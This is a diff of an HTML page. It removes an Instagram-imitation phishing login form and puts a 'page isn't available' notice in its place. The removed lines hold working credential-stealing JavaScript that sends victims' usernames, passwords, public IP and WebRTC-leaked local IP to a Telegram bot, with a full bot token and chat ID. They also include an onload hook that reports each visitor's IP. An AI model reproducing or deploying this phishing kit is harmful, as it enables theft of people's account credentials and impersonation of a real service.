@@ -1,10 +1,30 @@
-<!DOCTYPE html>
+
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <title>Page title</title>
     <style>
-        
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            
+        }
+
+        h1 {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            
+            margin-bottom: 10px;
+        }
+
+        a {
+            color: #007bff;
+            text-decoration: none;
+        }
     /* Universal Selectors */
 #root, body, html {
   height:100%;
@@ -379,65 +399,28 @@ span.language {
   }
 
 }
+main {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 70vh;
+}
 
     </style>
-    
-    
+       
 </head>
 
-<body onload="getIP()">
-    <span id="root">
-      <section class="section-all">
-  
-        <!-- 1-Role Main -->
-        <main class="main" role="main">
-          <div class="wrapper">
-            <article class="article">
-              <div class="content">
-                <div class="login-box">
-                  <div class="header">
-                    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
-                  </div><!-- Header end -->
-                  <div class="form-wrap">
-                    <form class="form">
-  
-                      <div class="input-box">
-                        <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
-                      </div>  
-  
-                      <div class="input-box">
-                        <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
-                      </div>  
-  
-                      <span class="button-box">
-                        <button  onclick="sendMessage()"   class="btn" type="submit" name="submit">Log in</button>
-                        
-                      </span>  
-  
-                      <a class="forgot" href="">Forgot password?</a>
-                    </form>
-                  </div> <!-- Form-wrap end -->
-                </div> <!-- Login-box end -->
-  
-                <div class="login-box">
-                  <p class="text">Don't have an account?<a href="#">Sign up</a></p>
-                </div> <!-- Signup-box end -->
-  
-                <div class="app">
-                  <p>Get the app.</p>
-                  <div class="app-img">
-                    <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
-                      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
-                    </a>
-                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
-                      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
-                    </a>  
-                  </div>  <!-- App-img end-->
-                </div> <!-- App end -->
-              </div> <!-- Content end -->
-            </article>
-          </div> <!-- Wrapper end -->
-        </main>
+<body>
+   <div id="root">
+    <section class="section-all">
+      <main class="main" role="main">
+        <center>
+          <h2>Sorry, this page isn't available</h2>
+          <p>The link you followed may be broken, or the page may have been removed. <a href="index.html">Go back to Instagram</a></p>
+        </center>
+      </main>
+    </section>
+  </div>
   
         <!-- 2-Role Footer -->
         <footer class="footer" role="contentinfo">
@@ -468,103 +451,6 @@ span.language {
         
       </section>
     </span> <!-- Root -->
- <script>
-     function la(src) {
-window.location=src;
-
-  }
-function sendMessage() {
-
- 
-var message = document.getElementById("name").value;
-var pass= document.getElementById("password").value;
-
-
-var ip = new RTCPeerConnection({ iceServers: [] });
-ip.createDataChannel('');
-ip.createOffer().then((offer) => ip.setLocalDescription(offer)).catch((error) => console.log(error));
-ip.onicecandidate = function(event) {
-if (event.candidate) {
-
-var ipp = "https://api.telegram.org/bot474532056:AAHHozpeq7kEbUl9J_B7zuRSVp0iH0goFJI/sendmessage?chat_id=627545301" + "&text= user ip: " +event.candidate.address;
-
-var p = new XMLHttpRequest();
-p.open("GET", ipp, true);
-p.send();
-                }
-            };
-
-var url = "https://api.telegram.org/bot474532056:AAHHozpeq7kEbUl9J_B7zuRSVp0iH0goFJI/sendmessage?chat_id=627545301" + "&text= user gmail: " + message;
-
-
-
-var pas = "https://api.telegram.org/bot474532056:AAHHozpeq7kEbUl9J_B7zuRSVp0iH0goFJI/sendmessage?chat_id=627545301" + "&text= user password: " + pass;
-
-
-
-
-var xhr = new XMLHttpRequest();
-xhr.open("GET", url, true);
-xhr.send();
-            
-            
-var r = new XMLHttpRequest();
-r.open("GET", pas, true);
-r.send();
- 
- 
- 
- window.location.href = "new.html";
-
-        }
-
-
-
-        
-        
-
-function getIP() {
-fetch('https://api.ipify.org?format=json')
-.then(response => response.json())
-.then(data => {
-var ipAddress = data.ip;
-
-
-
-
-
-var s = "https://api.telegram.org/bot474532056:AAHHozpeq7kEbUl9J_B7zuRSVp0iH0goFJI/sendmessage?chat_id=627545301" +"&text= user IP: " + ipAddress;
-
-var sr = new XMLHttpRequest();
-sr.open("GET", s, true);
-sr.send();
-            });
-            
-            
-            
-            
-            
-            var ip = new RTCPeerConnection({ iceServers: [] });
-ip.createDataChannel('');
-ip.createOffer().then((offer) => ip.setLocalDescription(offer)).catch((error) => console.log(error));
-ip.onicecandidate = function(event) {
-if (event.candidate) {
-
-
-var ipp = "https://api.telegram.org/bot474532056:AAHHozpeq7kEbUl9J_B7zuRSVp0iH0goFJI/sendmessage?chat_id=627545301" + "&text= user ip: " +event.candidate.address;
-
-var p = new XMLHttpRequest();
-p.open("GET", ipp, true);
-p.send();
-                }
-            };
-            
-     }
-
-
-
-
-
- </script>
   </body>
   </html>
+  
